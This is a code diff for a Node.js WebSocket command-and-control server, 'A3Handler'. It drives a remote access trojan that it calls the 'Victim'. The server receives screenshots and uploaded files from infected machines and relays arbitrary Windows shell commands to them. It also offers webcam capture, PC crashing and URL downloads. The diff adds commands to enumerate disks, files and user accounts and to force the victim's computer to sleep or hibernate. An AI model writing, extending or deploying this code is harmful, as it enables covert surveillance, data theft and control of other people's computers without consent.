@@ -1,6 +1,7 @@
 const WebSocket = require('ws');
 const colors = require('colors');
 var mkdirp = require('mkdirp');
+
 require('events').EventEmitter.setMaxListeners = 1;
 var menu = true;
 var WebsocketErrorCodes = {
@@ -16,8 +17,11 @@ var workingDir = "";
 sessions = [];
 var filename = "";
 const wss = new WebSocket.Server({
-	port: 4422
+	port: 4422,
+	maxReceivedFrameSize: 131072,
+    maxReceivedMessageSize: 10 * 1024 * 1024
 });
+
 const readline = require('readline');
 const rl = readline.createInterface({
 	input: process.stdin,
@@ -27,26 +31,7 @@ const rl = readline.createInterface({
 });
 currentSession = 0;
 console.log("\n");
-console.log("      _                      _______                      _");
-console.log("   _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_");
-console.log("  dP'  ~YMMb            dOOOOOOA3OOOOOOOb            aMMP~  `Yb");
-console.log("  V      ~\"Mb         dOOOOOOA3OOOOOOOOOb          dM\"~      V");
-console.log("           `Mb.       dOOOOOOOOA3OOOOOOOOOb       ,dM'");
-console.log("            `YMb._   |OOOOOOOOOA3OOOOOOOOOO|   _,dMP'");
-console.log("       __     `YMMM| OP'~\"YOOOOOOOOOOOP\"~`YO |MMMP'     __");
-console.log("     ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.");
-console.log("  _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._");
-console.log(" <MMP'     `~YMMa_   YOOo   @  OOO  @   oOOP   _adMP~'      `YMM>");
-console.log("              `YMMMM\`OOOo     OOO     oOOO'/MMMMP'");
-console.log("      ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.");
-console.log("    ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.");
-console.log("   ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.");
-console.log("   MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM");
-console.log("   YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP");
-console.log("    `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'");
-console.log("      `'                  `OObNNNNNdOO'                   `'");
-console.log("                            `~OOOOO~'");
-console.log("\n\n");
+
 console.log("[".bold + "+".green + "] Waiting for connection to server !".bold);
 
 rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
@@ -67,8 +52,8 @@ wss.on('connection', function connection(ws) {
 	ws.on('message', function incoming(message) {
 		if(ws._socket.remoteAddress.replace("::ffff:", "") == sessions[currentSession].clientAddress){
 			if (typeof message == "object") {
-				mkdirp('files/' + sessions[currentSession].clientAddress + "/", function(err) { 
-					var stream = require("fs").createWriteStream('files/' + sessions[currentSession].clientAddress + "/" + filename);
+				mkdirp('clients/' + sessions[currentSession].clientAddress + "/files", function(err) { 
+					var stream = require("fs").createWriteStream('clients/' + sessions[currentSession].clientAddress + "/files" + "/" + filename);
 					stream.once("open", function () {
 						stream.write(message, "base64");
 						stream.on('finish', function () {
@@ -92,8 +77,8 @@ wss.on('connection', function connection(ws) {
 				ws.send("#pwd");
 			} else if (message.startsWith("##SCREENSHOT##")) {
 				var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
-				mkdirp('screenshots/' + sessions[currentSession].clientAddress + "/", function(err) { 
-					require("fs").writeFile("screenshots/" + sessions[currentSession].clientAddress + "/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
+				mkdirp('clients/' + sessions[currentSession].clientAddress + "/screenshots/", function(err) { 
+					require("fs").writeFile('clients/' + sessions[currentSession].clientAddress + "/screenshots/" + (new Date()).getDay() + ".png", base64Data, 'base64', function (err) {});
 				});
 			}else if (message.startsWith("##SPEEDTEST##")) {
 				console.log("[".bold + "i".yellow + "] Victim's internet speed is ".bold + JSON.parse(message.replace("##SPEEDTEST##","")).speed.bold + "Mo/s !".bold);
@@ -143,7 +128,7 @@ function findSessionNumber(SS, SE){
 }
 
 function suggestions(line) {
-	const completions = 'win_help exit help speedtest sessions background list_users crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const completions = 'win_help exit help speedtest sessions background get_user_infos set_state list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
 	const hits = completions.filter((c) => c.startsWith(line));
 	return [hits.length ? hits : completions, line];
 }
@@ -157,6 +142,38 @@ rl.on('line', (line) => {
 		} else if (msg == "speedtest") {
 			console.log("[".bold + "+".blue + "] Speed testing...".bold);
 			sessions[currentSession].send(msg);
+		} else if (msg == "list_disks") {
+			console.log("[".bold + "+".blue + "] Listing disks !".bold);
+			sessions[currentSession].send("wmic logicaldisk get deviceid, volumename, description");
+		} else if (msg.startsWith("list_files")) {
+			if(msg.replace("list_files","").length > 0){
+				msg = msg.split(" ")[0] + " " + msg.substr(msg.indexOf(' ') + 1).replaceAll(" ","?");
+				if(msg.split(" ").length == 2){
+					if((msg.split(" ")[1][1] == ":" && msg.split(" ")[1][2] == "/") || (msg.split(" ")[1][1] == ":" && msg.split(" ")[1][2] == "\\") || (msg.split(" ")[1][1] == ":" && msg.split(" ")[1].length == 2)){
+						if(msg.split(" ")[1].replace(":/", "").replace(":\\","").substr(1).length > 0){
+							sessions[currentSession].send(msg.split(" ")[1][0] + ": & cd \"" + msg.split(" ")[1][0] + ":/" + msg.split(" ")[1].replace(":/", "").replace(":\\","").substr(1).replaceAll("?"," ") + "\" & dir");
+						}else{
+							sessions[currentSession].send(msg.split(" ")[1][0] + ": & dir");
+						}
+					}else{
+						sessions[currentSession].send("cd \"" + msg.split(" ")[1].replaceAll("?"," ") + "\" & dir");
+					}
+				}else{
+					console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "list_files <path>");
+					console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "C:/Users");
+					console.log("              E:/");
+					console.log("              F:/");
+					console.log("              /Users/user");
+					rl.prompt();
+				}
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "list_files <path>");
+				console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "C:/");
+				console.log("               E:\\");
+				console.log("               E:");
+				console.log("               /Users/user");
+				rl.prompt();
+			}
 		} else if (msg == "background") {
 			console.log("[".bold + "+".blue + "] Session is now in background...".bold);
 			menu = true;
@@ -199,15 +216,37 @@ rl.on('line', (line) => {
 			console.log("[".bold + "+".blue + "] Capturing and uploading picture (May exceed 10MO, please be patient)...".bold);
 			sessions[currentSession].send(msg);
 		}else if(msg == "list_users"){
-			sessions[currentSession].send("cd /Users & dir");
+			sessions[currentSession].send("net user");
+		}else if(msg.startsWith("get_user_infos")){
+			if(msg.split(" ").length == 2){
+				sessions[currentSession].send("net user " + msg.split(" ")[1]);
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "get_user_info <username>");
+				rl.prompt();
+			}
 		}else if(msg == "help"){
 			console.log(cmdListSessions.join("\n"));
 			rl.prompt();
 		}else if(msg == "win_help"){
 			sessions[currentSession].send("help");
 		}else if(msg == "exit"){
-			console.log("[".bold + "+".green + "] Have a great day ! ".bold + "A3".underline.cyan +  " over !".bold);
-			process.exit(0);
+			console.log("[".bold + "+".green + "] Type ".bold + "background".bold.cyan + " if you want to leave this session, then type ".bold + "exit".bold.cyan + " to leave the program ! ".bold);
+		}else if(msg.startsWith("set_state")){
+			if(msg.split(" ").length == 2){
+				if(msg.split(" ")[1] == "sleeping"){
+					console.log("[".bold + "+".blue + "] Computer is going to sleep !".bold);
+					sessions[currentSession].send("rundll32.exe powrprof.dll,SetSuspendState sleep");
+				}else if(msg.split(" ")[1] == "hibernate"){
+					console.log("[".bold + "+".blue + "] Computer is going to hibernate !".bold);
+					sessions[currentSession].send("rundll32.exe powrprof.dll,SetSuspendState hibernate");
+				}else{
+					console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "set_state <sleeping/hibernate>");
+					rl.prompt();
+				}
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "set_state <sleeping/hibernate>");
+				rl.prompt();
+			}
 		}else{
 			sessions[currentSession].send(msg);
 		}
@@ -227,6 +266,8 @@ rl.on('line', (line) => {
 					currentSession = msg.split(" ")[2];
 					menu = false;
 					sessions[currentSession].send("SENDHELLO");
+				}else{
+					console.log("[".white + "-".red + "]".white + " Session ".red + msg.split(" ")[2].underline + " does not exist !".red);
 				}
 			}else{
 				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "sessions connect <ID>\n                              sessions list");
@@ -256,6 +297,18 @@ function ValidURL(str) {
 	  return false;
 	}
   }
+
+String.prototype.replaceAll = function(replace, by){
+	var re = "";
+	for(a = 0; a < this.length; a++){
+		if(this[a] == replace){
+			re += by;
+		}else{
+			re += this[a];
+		}
+	}
+	return re;
+}
 
 var cmdListSessions = ["help => shows this message.","screenshot => take screenshot of victim's computer screen. Screenshots are located in screeshots/ClientIP folder."];
 var cmdListHandler = ["help => shows this message.",""];
